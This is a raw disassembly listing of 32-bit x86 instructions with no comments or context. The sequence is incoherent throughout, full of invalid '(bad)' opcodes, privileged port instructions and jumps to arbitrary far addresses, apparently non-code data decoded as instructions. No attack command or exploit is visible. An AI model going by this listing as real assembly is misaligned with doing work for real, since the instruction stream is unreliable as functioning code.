  421281:	ficomp DWORD PTR [ebp+0x24]
  421284:	push   ds
  421285:	xor    edi,DWORD PTR ds:0x98409b92
  42128b:	rcr    DWORD PTR [eax+0x40],0x24
  42128f:	or     BYTE PTR [esi-0x7e03437],0xf7
  421296:	aas    
  421297:	pusha  
  421298:	dec    DWORD PTR [eax]
  42129a:	mov    ebp,0x94b89607
  42129f:	sahf   
  4212a0:	stos   BYTE PTR es:[edi],al
  4212a1:	scas   al,BYTE PTR es:[edi]
  4212a2:	mov    ah,BYTE PTR [ecx+eiz*1]
  4212a5:	ja     0x4212d1
  4212a7:	jge    0x421319
  4212a9:	push   ss
  4212aa:	mov    ah,0x6e
  4212ac:	fstp   st(1)
  4212ae:	pop    eax
  4212af:	fldcw  WORD PTR [edi-0x756c8052]
  4212b5:	cli    
  4212b6:	sub    BYTE PTR [esi],ch
  4212b8:	in     eax,dx
  4212b9:	outs   dx,BYTE PTR ds:[esi]
  4212ba:	mov    eax,0xfe723f5e
  4212bf:	retf   0xacfd
  4212c2:	inc    esi
  4212c3:	js     0x42130a
  4212c5:	pop    ecx
  4212c6:	(bad)  
  4212c7:	fistp  QWORD PTR ds:0xbc731085
  4212cd:	cmp    ah,ch
  4212cf:	nop
  4212d0:	jns    0x421271
  4212d2:	sbb    ebp,edi
  4212d4:	pusha  
  4212d5:	imul   ebp,DWORD PTR [edx],0x90acb1b6
  4212db:	mov    bh,BYTE PTR [ebx+eiz*1]
  4212de:	xchg   ebp,eax
  4212df:	stc    
  4212e0:	iret   
  4212e1:	sbb    bl,al
  4212e3:	ficom  WORD PTR [ecx+0x29d68e6f]
  4212e9:	and    al,0xbf
  4212eb:	retf   
  4212ec:	ins    DWORD PTR es:[edi],dx
  4212ed:	xchg   esp,eax
  4212ee:	mov    al,ds:0xe5e9519c
  4212f3:	mov    ?,edx
  4212f5:	scas   eax,DWORD PTR es:[edi]
  4212f6:	push   cs
  4212f7:	inc    eax
  4212f8:	dec    edx
  4212f9:	ja     0x42127d
  4212fb:	popf   
  4212fc:	rcr    al,cl
  4212fe:	(bad)  
  4212ff:	retf   
  421300:	jae    0x421359
  421302:	and    DWORD PTR [ecx],ebx
  421304:	ds mov edi,eax
  421307:	jnp    0x421351
  421309:	mov    DWORD PTR ss:[ebx],edi
  42130c:	adc    eax,0x22461dbf
  421311:	cmp    al,0x5d
  421313:	push   ds
  421314:	outs   dx,BYTE PTR ds:[esi]
  421315:	mov    edx,DWORD PTR [ebp+0x19]
  421318:	outs   dx,DWORD PTR ds:[esi]
  421319:	add    dl,BYTE PTR [ecx+eiz*8-0x12158706]
  421320:	mov    ch,0x88
  421322:	addr16 clc 
  421324:	adc    bl,BYTE PTR [edi-0x554495c9]
  42132a:	add    BYTE PTR [edx],0x2b
  42132d:	and    eax,0x2847470
  421332:	inc    ebp
  421333:	xor    al,0xc3
  421335:	or     bl,BYTE PTR [ebx+0xcfa91b1]
  42133b:	fidivr WORD PTR [edi]
  42133d:	daa    
  42133e:	jae    0x4213bc
  421340:	adc    DWORD PTR [edi],edi
  421342:	mov    ch,0xdf
  421344:	sbb    DWORD PTR [esi+eiz*1-0x6e447b3d],0x98888de3
  42134f:	mov    eax,DWORD PTR [edi-0xa]
  421352:	stos   DWORD PTR es:[edi],eax
  421353:	mov    esp,0xccb27bd6
  421358:	xchg   edx,eax
  421359:	inc    eax
  42135a:	dec    edi
  42135b:	pop    eax
  42135c:	push   ebp
  42135d:	mov    eax,ds:0x94adc560
  421362:	lods   al,BYTE PTR ds:[esi]
  421363:	outs   dx,DWORD PTR ds:[esi]
  421364:	jmp    0xc86b098e
  421369:	icebp  
  42136a:	test   DWORD PTR [ebx-0x69ad4cca],edi
  421370:	rol    BYTE PTR [edi+0x42],1
  421373:	es xor al,ah
  421376:	push   esi
  421377:	jne    0x42137a
  421379:	mov    ch,0x47
  42137b:	inc    edx
  42137c:	fucomp st(3)
  42137e:	mov    ebp,DWORD PTR [esi+0x616db7eb]
  421384:	out    dx,eax
  421385:	(bad)  
  421386:	out    0x83,al
  421388:	mov    edi,0x69a5c23a
  42138d:	push   esi
  42138e:	inc    esp
  42138f:	or     bl,ah
  421391:	xor    al,0x8
  421393:	or     DWORD PTR [ebp-0x2398dd19],ecx
  421399:	sbb    BYTE PTR [ebp+0x282378],bh
  42139f:	jo     0x4213ea
  4213a1:	pop    es
  4213a2:	jg     0x4213fe
  4213a4:	and    DWORD PTR [esi+0x53b3fef2],ecx
  4213aa:	sbb    al,0x64
  4213ac:	cmp    BYTE PTR [eax-0x42878622],ch
  4213b2:	fcmovnbe st,st(6)
  4213b4:	add    bl,BYTE PTR [ebx-0x70a3e384]
  4213ba:	sbb    BYTE PTR [ebp+0x30],al
  4213bd:	xchg   DWORD PTR [ebx-0x572cfc6],ebx
  4213c3:	sbb    BYTE PTR [edx],ch
  4213c5:	inc    eax
  4213c6:	xor    al,0xce
  4213c8:	dec    ebp
  4213c9:	fcmovb st,st(2)
  4213cb:	fwait
  4213cc:	and    ch,BYTE PTR [esi+eax*2-0x36]
  4213d0:	pop    edi
  4213d1:	cmp    eax,0xcee46072
  4213d6:	xor    ecx,esi
  4213d8:	sbb    eax,0x5f5522bb
  4213dd:	loop   0x4213de
  4213df:	repz int 0x4d
  4213e2:	push   eax
  4213e3:	inc    ebx
  4213e4:	dec    edx
  4213e5:	clc    
  4213e6:	ins    BYTE PTR es:[edi],dx
  4213e7:	push   cs
  4213e8:	fisubr DWORD PTR [edx+eax*8]
  4213eb:	dec    edi
  4213ec:	and    al,0x84
  4213ee:	retf   
  4213ef:	mov    dh,ah
  4213f1:	pop    esp
  4213f2:	test   DWORD PTR [ebp-0x5b],ebx
  4213f5:	mov    esi,0x7bed245c
  4213fa:	push   es
  4213fb:	lea    eax,[esi-0x5de47a27]
  421401:	xchg   esp,eax
  421402:	test   al,0xe9
  421404:	and    dl,cl
  421406:	fist   DWORD PTR [edi]
  421408:	stos   BYTE PTR es:[edi],al
  421409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42140a:	and    BYTE PTR es:[esp+ebp*1-0x8d27832],bh
  421412:	enter  0xf161,0x57
  421416:	push   edi
  421417:	aam    0xeb
  421419:	xlat   BYTE PTR ds:[ebx]
  42141a:	jmp    0x606f5d01
  42141f:	cmp    esi,DWORD PTR [esi-0x4e]
  421422:	lahf   
  421423:	push   ds
  421424:	pop    esi
  421425:	or     DWORD PTR [edx],edx
  421427:	inc    esp
  421428:	or     al,BYTE PTR [edx]
  42142a:	xchg   ebp,eax
  42142b:	dec    esi
  42142c:	and    eax,0x5fa08eb5
  421431:	dec    esp
  421432:	sub    edx,DWORD PTR [ebx]
  421434:	int    0xc4
  421436:	call   0x1d039a11
  42143b:	jne    0x421422
  42143d:	push   ebp
  42143e:	inc    esp
  42143f:	mov    esi,0xa34a2ccd
  421444:	adc    al,dh
  421446:	loop   0x421437
  421448:	jmp    DWORD PTR [esi+0x2c]
  42144b:	push   ebx
  42144c:	or     al,0x9c
  42144e:	sbb    eax,0xcd622380
  421453:	jnp    0x42142e
  421455:	fs push ds
  421457:	xor    eax,DWORD PTR [esi]
  421459:	pop    ds
  42145a:	jo     0x42140c
  42145c:	xchg   BYTE PTR [eax-0x7945d2b2],al
  421462:	idiv   ecx
  421464:	aam    0x8d
  421466:	dec    eax
  421467:	stos   DWORD PTR es:[edi],eax
  421468:	or     BYTE PTR [edi],ah
  42146a:	mov    dl,0x78
  42146c:	pop    eax
  42146d:	xchg   bh,dh
  42146f:	inc    esp
  421470:	scas   eax,DWORD PTR es:[edi]
  421471:	stos   DWORD PTR es:[edi],eax
  421472:	and    bh,cl
  421474:	mov    esp,DWORD PTR [ebx+eax*1+0x3e]
  421478:	arpl   WORD PTR [ebx-0x49b8bcad],ax
  42147e:	xchg   BYTE PTR [eax],ah
  421480:	inc    esp
  421481:	stos   DWORD PTR es:[edi],eax
  421482:	popa   
  421483:	mov    ds:0xd2a2290b,eax
  421488:	sub    BYTE PTR [edx],dl
  42148a:	shl    DWORD PTR [edi+0x7c],0x18
  42148e:	mov    di,0xe275
  421492:	jp     0x4214dc
  421494:	sub    BYTE PTR [ebx-0x3b],dh
  421497:	mov    ecx,0x6f4483f4
  42149c:	jecxz  0x4214e3
  42149e:	fimul  WORD PTR [ecx-0x45]
  4214a1:	out    dx,al
  4214a2:	cmp    BYTE PTR [edi-0x3caaf24f],0x36
  4214a9:	dec    edi
  4214aa:	inc    edx
  4214ab:	data16 lock div dh
  4214af:	bound  esi,QWORD PTR [ebp+0x66]
  4214b2:	shr    BYTE PTR [edi+ecx*8-0x1a],0x3d
  4214b7:	std    
  4214b8:	jmp    0xa5aa:0x3162e51c
  4214bf:	add    al,0xfa
  4214c1:	dec    ebx
  4214c2:	jno    0x4214d0
  4214c4:	cmp    DWORD PTR [edi],0xab00c88f
  4214ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214cb:	dec    edx
  4214cc:	xchg   ebx,eax
  4214cd:	jmp    0x39e1:0x725a02fd
  4214d4:	lahf   
  4214d5:	sbb    cl,BYTE PTR [edi+ecx*8+0x2a9cb7d2]
  4214dc:	jae    0x421508
  4214de:	and    BYTE PTR [ecx-0x6c1da2d],0x20
  4214e5:	popf   
  4214e6:	dec    ecx
  4214e7:	out    dx,al
  4214e8:	fwait
  4214e9:	sbb    cl,BYTE PTR [edi]
  4214eb:	adc    al,0x20
  4214ed:	xor    ah,BYTE PTR [esi+edi*2+0xc]
  4214f1:	test   eax,0xe467d10b
  4214f6:	sbb    al,BYTE PTR [edi]
  4214f8:	mov    edi,0x7f317cdd
  4214fd:	and    dl,BYTE PTR [ebx+0x6e]
  421500:	jmp    eax
  421502:	add    eax,0x4da1bcc7
  421507:	xlat   BYTE PTR ds:[ebx]
  421508:	cmp    BYTE PTR [eax+0x1ad60982],0x21
  42150f:	xor    bh,dh
  421511:	arpl   dx,dx
  421513:	loopne 0x421576
  421515:	pop    ebx
  421516:	xchg   esp,eax
  421517:	xor    eax,0x6eb0017f
  42151c:	cmp    eax,0xbf088383
  421521:	adc    eax,0xbdadac30
  421526:	and    ch,cl
  421528:	mov    ds:0x6f4a91b2,eax
  42152d:	xor    DWORD PTR [ebx],eax
  42152f:	scas   eax,DWORD PTR es:[edi]
  421530:	xor    dh,BYTE PTR [esi+0x23bcad74]
  421536:	mov    bh,0xe3
  421538:	jmp    0xfd11d5f4
  42153d:	into   
  42153e:	in     al,dx
  42153f:	adc    edi,esp
  421541:	test   dl,0xbd
  421544:	test   al,0x93
  421546:	loopne 0x4214ed
  421548:	dec    ecx
  421549:	outs   dx,DWORD PTR ds:[esi]
  42154a:	push   0x7e3f2616
  42154f:	invd   
  421551:	hlt    
  421552:	xor    eax,0x60872431
  421557:	push   eax
  421558:	je     0x421580
  42155a:	jg     0x42151a
  42155c:	pop    ds
  42155d:	idiv   DWORD PTR [esi-0x46]
  421560:	pop    ss
  421561:	fistp  DWORD PTR [eax+0x25]
  421564:	xor    ch,BYTE PTR [eax+edi*2]
  421567:	jbe    0x421543
  421569:	jnp    0x421599
  42156b:	xchg   esi,eax
  42156c:	in     eax,0x62
  42156e:	mov    eax,DWORD PTR [ecx]
  421570:	sub    edi,ecx
  421572:	xchg   DWORD PTR [edi+0x7bfab519],edi
  421578:	sti    
  421579:	int3   
  42157a:	mov    edi,0xa855970e
  42157f:	jae    0x421554
  421581:	push   edx
  421582:	or     ah,0x93
  421585:	cld    
  421586:	xor    eax,0xef828111
  42158b:	inc    BYTE PTR [ebx+0x1ec1e5c]
  421591:	jmp    0x4215cb
  421593:	inc    esp
  421594:	pop    eax
  421595:	mov    BYTE PTR [ebp-0x4fa5f1d],0x93
  42159c:	push   0x56
  42159e:	inc    ecx
  42159f:	inc    eax
  4215a0:	or     eax,0x6d2a42bb
  4215a5:	xlat   BYTE PTR ds:[ebx]
  4215a6:	mov    dh,0x57
  4215a8:	int    0xb9
  4215aa:	xchg   ecx,eax
  4215ab:	and    ebx,ebp
  4215ad:	repz mov edi,0x97cef199
  4215b3:	push   fs
  4215b5:	push   0xbb8ca125
  4215ba:	add    eax,0x26e05cbe
  4215bf:	lock pushf 
  4215c1:	mov    DWORD PTR [edi],ecx
  4215c3:	gs mov ebp,0xbbc3ee96
  4215c9:	pop    es
  4215ca:	xchg   BYTE PTR [edx-0x25c08e99],ah
  4215d0:	sub    BYTE PTR [ebx],0x87
  4215d3:	dec    esi
  4215d4:	call   0x3872011d
  4215d9:	popa   
  4215da:	and    al,cl
  4215dc:	sub    eax,0x476e51ff
  4215e1:	jno    0x421659
  4215e3:	lds    eax,FWORD PTR [ebx-0x11fda3da]
  4215e9:	inc    esp
  4215ea:	in     eax,dx
  4215eb:	dec    ebp
  4215ec:	das    
  4215ed:	scas   eax,DWORD PTR es:[edi]
  4215ee:	jb     0x4215cc
  4215f0:	mov    BYTE PTR [edi-0x71],bh
  4215f3:	(bad)  
  4215f4:	mov    ds:0x8296585c,eax
  4215f9:	sbb    eax,0x12f95efb
  4215fe:	xchg   ecx,eax
  4215ff:	dec    ecx
  421600:	sbb    al,0xcb
  421602:	jns    0x4215ea
  421604:	xor    eax,0x87877096
  421609:	inc    ebx
  42160a:	xor    BYTE PTR [esi+eiz*1+0x29c6ee83],al
  421611:	fdivr  QWORD PTR [edx-0x54fe5e4f]
  421617:	or     esi,ebx
  421619:	inc    esp
  42161a:	dec    eax
  42161b:	stos   BYTE PTR es:[edi],al
  42161c:	mov    DWORD PTR [edx+edx*4-0x4d],esi
  421620:	inc    esp
  421621:	out    0x93,al
  421623:	(bad)  
  421624:	in     al,dx
  421625:	or     BYTE PTR [edx],dh
  421627:	loop   0x421697
  421629:	add    DWORD PTR [eax],edx
  42162b:	fimul  DWORD PTR [ebx+0x4074922f]
  421631:	(bad)  [ebx-0x47]
  421634:	and    eax,0xe4ee77ed
  421639:	cmovns edx,DWORD PTR [eax]
  42163c:	add    DWORD PTR [edx+0x3e],ebx
  42163f:	xchg   ebp,eax
  421640:	imul   esi,ecx,0xffffffc1
  421643:	daa    
  421644:	cmp    dh,BYTE PTR [esi]
  421646:	and    BYTE PTR [esi+0x21],ch
  421649:	(bad)  
  42164a:	out    0x83,eax
  42164c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42164d:	lods   al,BYTE PTR ds:[esi]
  42164e:	dec    edi
  42164f:	adc    BYTE PTR [ebx-0xe4332a],dh
  421655:	fdivrp st(0),st
  421657:	xlat   BYTE PTR es:[ebx]
  421659:	mov    ds:0x2ba9bdf7,eax
  42165e:	lahf   
  42165f:	push   ecx
  421660:	jmp    0x4215ea
  421662:	pusha  
  421663:	jo     0x4216a7
  421665:	out    0xe9,al
  421667:	lods   al,BYTE PTR ds:[esi]
  421668:	push   0xfe98cdea
  42166d:	in     al,dx
  42166e:	mov    bh,0xc8
  421670:	imul   esp,DWORD PTR [edx+0x69b40b8f],0x6f9e5486
  42167a:	ror    cl,1
  42167c:	(bad)  
  42167d:	add    al,0x84
  42167f:	stos   BYTE PTR es:[edi],al
  421680:	push   ds
  421681:	inc    edi
  421682:	cmp    BYTE PTR ds:[eax+ebx*1-0x7d],ch
  421687:	dec    esp
  421688:	scas   al,BYTE PTR es:[edi]
  421689:	mov    esi,0xd7a637ca
  42168e:	and    al,0xb9
  421690:	mov    ebp,0xbcf51c83
  421695:	cmp    ch,BYTE PTR [eax]
  421697:	les    esi,FWORD PTR [esi+0x41de771e]
  42169d:	xchg   ebx,eax
  42169e:	add    BYTE PTR [esi],ah
  4216a0:	jle    0x421651
  4216a2:	(bad)  
  4216a3:	test   eax,esi
  4216a5:	imul   edi,DWORD PTR [edi],0x5b
  4216a8:	lahf   
  4216a9:	shl    DWORD PTR [ebx],0x67
  4216ac:	pop    ecx
  4216ad:	xor    eax,DWORD PTR ds:0x24063299
  4216b3:	jnp    0x421674
  4216b5:	push   esp
  4216b6:	push   ss
  4216b7:	rcl    al,cl
  4216b9:	adc    eax,0xf021d4c3
  4216be:	outs   dx,BYTE PTR ds:[esi]
  4216bf:	adc    DWORD PTR [esi],esp
  4216c1:	xor    eax,DWORD PTR [eax+0x367528f9]
  4216c7:	inc    ecx
  4216c8:	xchg   ebx,eax
  4216c9:	mov    BYTE PTR [ebx],bh
  4216cb:	push   cs
  4216cc:	add    edi,DWORD PTR [ebp-0xd]
  4216cf:	sbb    DWORD PTR [edx+0x2f69e111],ebp
  4216d5:	and    dh,BYTE PTR [edx-0x48]
  4216d8:	(bad)  [ecx+0x5db3068d]
  4216de:	into   
  4216df:	xor    BYTE PTR [ecx+0x42],dl
  4216e2:	push   ebp
  4216e3:	mov    al,cl
  4216e5:	mov    ebp,0x72b073c4
  4216ea:	dec    ebp
  4216eb:	iret   
  4216ec:	mov    cl,0x91
  4216ee:	mov    edi,0x178a89f6
  4216f3:	adc    DWORD PTR ss:[edx+0x2f],esi
  4216f7:	jl     0x4216d9
  4216f9:	shl    BYTE PTR [eax-0x50],0xaf
  4216fd:	pusha  
  4216fe:	mov    bl,0xdf
  421700:	mov    ebp,0x831328a5
  421705:	jae    0x421693
  421707:	fs aas 
  421709:	pop    ebp
  42170a:	sbb    eax,DWORD PTR [eax+ebp*4-0x20]
  42170e:	(bad)  
  42170f:	lea    ebx,[ebx+0x6c7d3c83]
  421715:	jp     0x42174b
  421717:	fild   DWORD PTR [esi]
  421719:	repz pusha 
  42171b:	xchg   BYTE PTR [edi+0x49],dh
  42171e:	dec    edx
  42171f:	idiv   DWORD PTR [ebp*8+0x3e23e4d1]
  421726:	pop    ebx
  421727:	cmp    eax,DWORD PTR [ebx+esi*2+0x2eeb38a3]
  42172e:	dec    ecx
  42172f:	mov    bl,0xef
  421731:	xchg   edx,eax
  421732:	mov    ah,0x28
  421734:	jp     0x421751
  421736:	icebp  
  421737:	test   esp,ecx
  421739:	or     ah,bl
  42173b:	mov    ds:0x687d9fd3,eax
  421740:	add    al,0xa
  421742:	sub    ah,bh
  421744:	dec    esi
  421745:	aam    0x20
  421747:	retf   0x3e09
  42174a:	lods   eax,DWORD PTR ds:[esi]
  42174b:	jge    0x42174d
  42174d:	call   0x75902813
  421752:	sbb    dh,BYTE PTR [edx-0x61]
  421755:	in     al,0xb4
  421757:	or     eax,0xa8777a4e
  42175c:	and    DWORD PTR [edi],esi
  42175e:	mov    eax,ds:0x9f02fefa
  421763:	lods   eax,DWORD PTR ds:[esi]
  421764:	jo     0x42174f
  421766:	call   0x393faf26
  42176b:	add    eax,0x345c4cc2
  421770:	aas    
  421771:	ret    
  421772:	out    dx,al
  421773:	mov    ebp,0xa0ab7437
  421778:	mov    ah,0xfe
  42177a:	inc    edx
  42177b:	pushf  
  42177c:	mov    dl,0xf5
  42177e:	fcom   QWORD PTR [edx+0x7c5f3d44]
  421784:	loope  0x421775
  421786:	jmp    0x4217c1
  421788:	lds    eax,FWORD PTR [edx+0x5e3a2204]
  42178e:	ins    DWORD PTR es:[edi],dx
  42178f:	mov    ch,0x4b
  421791:	sub    esi,esp
  421793:	mov    ebx,0xd56714aa
  421798:	push   esp
  421799:	js     0x42178f
  42179b:	(bad)  
  42179c:	iret   
  42179d:	inc    ecx
  42179e:	pop    edi
  42179f:	xor    eax,0x3dd3a454
  4217a4:	lock add BYTE PTR [esi-0x291cb5d2],0x4d
  4217ac:	je     0x4217bb
  4217ae:	xchg   DWORD PTR ds:0x77489d7e,eax
  4217b4:	cmp    eax,0x9deedad
  4217b9:	and    DWORD PTR [ecx],eax
  4217bb:	in     eax,0x7e
  4217bd:	and    al,BYTE PTR [eax]
  4217bf:	fldcw  WORD PTR [ebx+0x3700a06c]
  4217c5:	lds    edi,FWORD PTR [esi-0x4e6bfa30]
  4217cb:	jne    0x421753
  4217cd:	imul   esi,DWORD PTR [edx+0x26],0xbd92de9a
  4217d4:	cmp    eax,edi
  4217d6:	sbb    esi,esi
  4217d8:	pop    ebp
  4217d9:	jne    0x4217b9
  4217db:	ins    DWORD PTR es:[edi],dx
  4217dc:	sbb    al,0xd8
  4217de:	add    bl,BYTE PTR [ecx]
  4217e0:	sbb    ecx,DWORD PTR [edx+ecx*1+0x2d5d9892]
  4217e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217e8:	jne    0x4217f5
  4217ea:	les    ebp,FWORD PTR [edx-0xd53e906]
  4217f0:	and    DWORD PTR [esi-0x295f2a9],ebx
  4217f6:	pop    ebx
  4217f7:	not    DWORD PTR [edx-0x3f]
  4217fa:	add    ebp,DWORD PTR [ecx-0x13a7004b]
  421800:	(bad)  
  421801:	in     eax,0x4d
  421803:	and    eax,DWORD PTR [eax-0x7]
  421806:	es mov cl,0xbf
  421809:	add    ch,BYTE PTR [eax-0x56de6522]
  42180f:	sbb    DWORD PTR ds:0x9861e8bf,edi
  421815:	adc    al,0x63
  421817:	mov    cl,0xa4
  421819:	and    cl,BYTE PTR [ebx+0x5bba619c]
  42181f:	xor    al,0x4d
  421821:	dec    esi
  421822:	call   0x514f4812
  421827:	mov    esp,0x81ab4dca
  42182c:	add    BYTE PTR [ebp-0x60e5c129],bh
  421832:	mov    al,BYTE PTR [ecx-0x4c]
  421835:	pushf  
  421836:	push   eax
  421837:	inc    esp
  421838:	xchg   ebx,eax
  421839:	not    DWORD PTR [esi-0x3f]
  42183c:	dec    edx
  42183d:	and    ecx,edx
  42183f:	mov    ecx,0xa4ea4633
  421844:	xchg   esp,eax
  421845:	mov    cl,0x4c
  421847:	dec    ecx
  421848:	stos   DWORD PTR es:[edi],eax
  421849:	inc    eax
  42184a:	xor    BYTE PTR [edx-0x57],ah
  42184d:	or     BYTE PTR [edx+0x59],dh
  421850:	pop    ss
  421851:	mov    edi,0xb92f556f
  421856:	rcl    BYTE PTR [esi],0x1c
  421859:	loop   0x42181c
  42185b:	punpckhwd mm6,QWORD PTR [eax]
  42185e:	ret    0x211a
  421861:	pushf  
  421862:	cmp    ah,ch
  421864:	mov    edx,0x1404316
  421869:	mov    esi,0x7d5237ef
  42186e:	pop    ds
  42186f:	(bad)  
  421870:	push   ss
  421871:	js     0x42180a
  421873:	inc    ebx
  421874:	cmp    dh,BYTE PTR [edi+eax*1]
  421877:	mov    ch,bl
  421879:	int    0xc7
  42187b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42187c:	mov    ?,WORD PTR [eax-0x45c1abb4]
  421882:	cwde   
  421883:	sti    
  421884:	cmp    al,0x75
  421886:	lock (bad) 
  421888:	fcmovnb st,st(2)
  42188a:	in     eax,dx
  42188b:	arpl   ax,si
  42188d:	fisttp WORD PTR [esi-0x6c8a445f]
  421893:	xor    ah,BYTE PTR [ecx]
  421895:	call   0x864dc843
  42189a:	and    dh,BYTE PTR [edi]
  42189c:	jae    0x4218fd
  42189e:	xchg   edx,eax
  42189f:	ror    DWORD PTR [edx-0x41],0x9a
  4218a3:	enter  0x47a8,0xa8
  4218a7:	ja     0x42190f
  4218a9:	bound  ebp,QWORD PTR [eax+0x5ee8fcb0]
  4218af:	sbb    BYTE PTR [esi],al
  4218b1:	xchg   esi,eax
  4218b2:	into   
  4218b3:	push   0x65
  4218b5:	jp     0x421893
  4218b7:	inc    esp
  4218b8:	test   eax,0x1d96c3ec
  4218bd:	enter  0x8d4b,0xb2
  4218c1:	xchg   esi,eax
  4218c2:	aas    
  4218c3:	xor    ebp,edx
  4218c5:	ins    DWORD PTR es:[edi],dx
  4218c6:	test   DWORD PTR [edi],edx
  4218c8:	dec    eax
  4218c9:	rcl    esi,cl
  4218cb:	add    BYTE PTR [ebx],al
  4218cd:	(bad)  
  4218ce:	jo     0x42189d
  4218d0:	or     eax,0xc259f9e1
  4218d5:	ret    
  4218d6:	pop    ebx
  4218d7:	arpl   WORD PTR [esp+eiz*2-0x68],si
  4218db:	mov    DWORD PTR [edi],eax
  4218dd:	mov    WORD PTR [ecx],cs
  4218df:	pop    ebx
  4218e0:	in     eax,dx
  4218e1:	jle    0x4218fa
  4218e3:	sub    edi,DWORD PTR [ebp+0x4b74dcfd]
  4218e9:	mov    edi,0x78c63a40
  4218ee:	mov    ch,BYTE PTR ds:0x4ff3c14
  4218f4:	xchg   ebx,eax
  4218f5:	mov    al,0x64
  4218f7:	and    DWORD PTR [edx],edx
  4218f9:	loop   0x421926
  4218fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218fc:	lods   eax,DWORD PTR ds:[esi]
  4218fd:	fbld   TBYTE PTR [ebx+edi*2]
  421900:	aaa    
  421901:	out    dx,al
  421902:	not    DWORD PTR [ecx+ebx*1+0x5d0db84e]
  421909:	push   0x1b516899
  42190e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42190f:	mov    eax,ds:0x289fc8d1
  421914:	cmp    ecx,DWORD PTR [ecx-0x5661f2fa]
  42191a:	in     eax,dx
  42191b:	stc    
  42191c:	sub    bh,dl
  42191e:	jecxz  0x4218c5
  421920:	icebp  
  421921:	test   eax,0x2f1be386
  421926:	aas    
  421927:	dec    edi
  421928:	or     eax,0x1e35f913
  42192d:	nop
  42192e:	mov    bh,BYTE PTR [edi+eax*8]
  421931:	scas   al,BYTE PTR es:[edi]
  421932:	ret    
  421933:	jmp    0x7f55:0xdab014a0
  42193a:	xchg   ecx,eax
  42193b:	sar    BYTE PTR [ecx+0x4da8f707],cl
  421941:	(bad)  
  421942:	leave  
  421943:	arpl   WORD PTR [esi+0x7ab354ba],di
  421949:	mov    bh,0x7
  42194b:	sbb    al,0x96
  42194d:	rcl    BYTE PTR [edi-0x5c],1
  421950:	retf   0xc5ca
  421953:	mov    al,0x68
  421955:	cmc    
  421956:	fisubr DWORD PTR [edi+0x4178d034]
  42195c:	cwde   
  42195d:	outs   dx,BYTE PTR ds:[esi]
  42195e:	(bad)  
  42195f:	test   al,0x3c
  421961:	stc    
  421962:	mov    edi,0xdc1601d5
  421967:	rol    edx,cl
  421969:	nop
  42196a:	jle    0x421951
  42196c:	push   ds
  42196d:	jno    0x4219cb
  42196f:	out    0x32,eax
  421971:	dec    ebp
  421972:	cmc    
  421973:	push   esi
  421974:	sub    ecx,DWORD PTR [esi+esi*1]
  421977:	mov    BYTE PTR [ebp+ebx*2+0x6b4e05be],bl
  42197e:	in     eax,dx
  42197f:	(bad)  
  421980:	and    al,BYTE PTR [ebx-0x43]
  421983:	mov    dl,0x91
  421985:	mov    bh,0x7c
  421987:	loopne 0x421971
  421989:	mov    al,0x15
  42198b:	cmp    BYTE PTR [esi+0x674d059c],ch
  421991:	test   DWORD PTR [edi],edi
  421993:	popa   
  421994:	(bad)  
  421995:	call   0x5c50:0xe7651033
  42199c:	iret   
  42199d:	jge    0x4219e9
  42199f:	pop    ebx
  4219a0:	cmp    al,0x51
  4219a2:	xchg   edx,eax
  4219a3:	jp     0x4219d3
  4219a5:	(bad)  
  4219a6:	rol    ch,1
  4219a8:	xchg   bl,bh
  4219aa:	xlat   BYTE PTR ds:[ebx]
  4219ab:	adc    eax,0xd99e4180
  4219b0:	jmp    0x3c08:0xf8274cf1
  4219b7:	(bad)  
  4219b8:	mov    esi,DWORD PTR [ebx-0x71]
  4219bb:	aaa    
  4219bc:	push   edx
  4219bd:	cmp    BYTE PTR [ecx],0x56
  4219c0:	jmp    FWORD PTR ds:0x4abba46b
  4219c6:	sub    al,0x30
  4219c8:	and    bl,BYTE PTR [ecx+0x7b6ff485]
  4219ce:	lahf   
  4219cf:	loope  0x4219f9
  4219d1:	inc    ecx
  4219d2:	pop    edx
  4219d3:	mov    ecx,0x2fe72ba2
  4219d8:	fcmovnbe st,st(2)
  4219da:	mov    ah,0xb7
  4219dc:	xor    eax,0xe54a62c8
  4219e1:	mov    ebx,0x52eedc84
  4219e6:	push   0xc6c1aa9d
  4219eb:	mov    ds:0x40fa5159,eax
  4219f0:	in     eax,dx
  4219f1:	cmovge ebx,esp
  4219f4:	scas   al,BYTE PTR es:[edi]
  4219f5:	push   cs
  4219f6:	stos   BYTE PTR es:[edi],al
  4219f7:	pop    es
  4219f8:	pop    edi
  4219f9:	call   0x7aa6:0xa863083d
  421a00:	or     dl,bl
  421a02:	aaa    
  421a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a04:	mov    bh,0xaa
  421a06:	cmp    DWORD PTR [ebx+0x6a1a7568],edi
  421a0c:	xchg   ebp,eax
  421a0d:	jno    0x421a14
  421a0f:	int3   
  421a10:	jge    0x4219f5
  421a12:	mov    edx,DWORD PTR [esi+0xb]
  421a15:	nop
  421a16:	jb     0x421a90
  421a18:	push   ebp
  421a19:	ss jp  0x4219ce
  421a1c:	leave  
  421a1d:	add    edi,DWORD PTR [eax+0x11de6510]
  421a23:	mov    bl,0xf7
  421a25:	dec    esi
  421a26:	out    dx,al
  421a27:	loope  0x4219bb
  421a29:	fadd   DWORD PTR [ecx+0xd]
  421a2c:	imul   edx,ebp,0xffffff83
  421a2f:	(bad)  
  421a30:	mov    dl,0x65
  421a32:	sbb    ebp,edx
  421a34:	adc    DWORD PTR [edx+0x7df83171],0x112107ca
  421a3e:	popf   
  421a3f:	dec    esi
  421a40:	imul   ecx,DWORD PTR [ebx],0x232473fe
  421a46:	ja     0x421a36
  421a48:	xlat   BYTE PTR ds:[ebx]
  421a49:	add    DWORD PTR [ecx-0x5e],ebp
  421a4c:	and    eax,0x7118958c
  421a51:	and    al,0x56
  421a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a54:	push   eax
  421a55:	imul   esi,DWORD PTR [edx+ebp*4-0x5d],0x7cd15e89
  421a5d:	outs   dx,BYTE PTR ds:[esi]
  421a5e:	inc    edi
  421a5f:	mov    al,BYTE PTR [edi-0x5bb5ee1a]
  421a65:	push   cs
  421a66:	mov    ds:0x8cb86e05,eax
